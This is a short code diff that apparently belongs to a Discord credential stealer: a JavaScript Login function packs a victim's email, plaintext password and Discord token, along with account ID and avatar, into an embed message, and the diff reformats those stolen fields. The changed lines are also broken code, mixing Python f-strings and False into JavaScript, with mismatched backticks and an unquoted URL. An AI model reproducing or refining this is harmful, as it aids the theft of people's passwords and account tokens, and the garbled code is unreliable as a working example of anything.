@@ -152,10 +152,25 @@ function Login(email, password, token) {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " account",
-                            "value": `email - ${email} & password - ${password}`,
+                            "name": " email",
+                            "value": ` - `${email}``,
                             "inline": true
                         },
+			{
+			    "name": "᲼᲼",
+			    "value": f"᲼᲼",
+			    "inline": False
+			},
+                        {
+                            "name": " password",
+                            "value": ` - `${password}``,
+                            "inline": true
+                        },
+			{
+			    "name": "᲼᲼",
+			    "value": f"᲼᲼",
+			    "inline": False
+			},
                         {
                             "name": " token",
                             "value": ` - \`${token}\``,
@@ -164,7 +179,9 @@ function Login(email, password, token) {
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+		    "thumbnail": {
+                        "url": https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp
                     },
                     "footer": {
                         "text": ""
